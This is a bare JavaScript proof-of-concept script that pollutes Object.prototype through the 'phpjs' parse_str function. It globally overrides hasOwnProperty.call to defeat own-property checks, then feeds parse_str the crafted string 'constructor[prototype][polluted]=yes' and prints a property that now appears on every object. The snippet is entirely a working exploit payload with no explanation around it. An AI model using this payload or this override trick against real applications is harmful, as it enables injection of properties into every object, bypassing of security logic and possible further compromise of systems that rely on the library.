Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const p = require('phpjs');
p.parse_str('constructor[prototype][polluted]=yes', {});
console.log({}.polluted);